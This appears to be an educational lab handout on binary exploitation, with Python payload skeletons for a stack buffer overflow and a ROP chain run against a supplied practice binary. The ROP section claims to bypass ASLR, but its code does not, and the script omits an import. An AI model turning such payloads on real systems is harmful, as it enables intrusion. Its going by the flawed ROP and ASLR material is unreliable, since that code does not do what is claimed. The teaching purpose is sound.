# Exploit Development & Binary Exploitation Lab

## **Overview**
This lab focuses on offensive security techniques involving binary exploitation and exploit development. Students will learn how to analyze vulnerable binaries, manipulate memory, and craft custom exploits to gain unauthorized access.

## **What You Will Learn**
- Understanding memory corruption vulnerabilities (buffer overflows, format string exploits, heap exploitation)
- Using debuggers to analyze binary behavior
- Writing custom exploits in Python
- Bypassing security protections like ASLR and DEP

---

## **Lab Instructions**

### **1. Setting Up Your Environment**
You will need:
- A **Debian or Kali Linux VM** (VirtualBox, WSL, or cloud-based instance)
- Python3 installed (`sudo apt update && sudo apt install python3`)
- Exploitation tools: `gdb`, `pwntools`, `radare2`, `gef`, `ROPgadget`

#### **Install required tools:**
```bash
sudo apt install gdb gdb-multiarch python3-pwntools radare2 ropgadget
```

---

### **2. Identifying Vulnerabilities in a Binary**

#### **Step 1: Download the vulnerable binary**
```bash
wget https://example.com/vuln_binary -O vuln_binary
chmod +x vuln_binary
```

#### **Step 2: Analyze the binary**
```bash
gdb -q vuln_binary
```
```gdb
checksec vuln_binary  # Check security protections
run  # Execute the binary and observe behavior
```

---

### **3. Exploiting a Buffer Overflow**

#### **Step 1: Fuzzing Input to Find Overflow Point**
```python
#!/usr/bin/python3
import sys
import struct

offset = 100  # Modify based on test results
payload = b"A" * offset + struct.pack("<I", 0xdeadbeef)  # Overwrite return address

sys.stdout.buffer.write(payload)
```
Save as `exploit.py` and run:
```bash
python3 exploit.py | ./vuln_binary
```

---

### **4. Bypassing ASLR with ROP Chains**

#### **Step 1: Generate a ROP chain**
```bash
ROPgadget --binary vuln_binary --only "pop|ret"
```
#### **Step 2: Modify exploit to include ROP gadgets**
```python
import struct

pop_ret = struct.pack("<I", 0x08048484)  # Example gadget address
shellcode = b"\x90" * 16 + b"..."  # Inject shellcode

payload = b"A" * 100 + pop_ret + shellcode
sys.stdout.buffer.write(payload)
```
Run again:
```bash
python3 exploit.py | ./vuln_binary
```

## **Final Submission**
- Submit a **Google Doc** with screenshots of your completed tasks.
- Ensure each screenshot has a **caption** explaining what was accomplished.
- Follow submission guidelines as provided by your instructor.
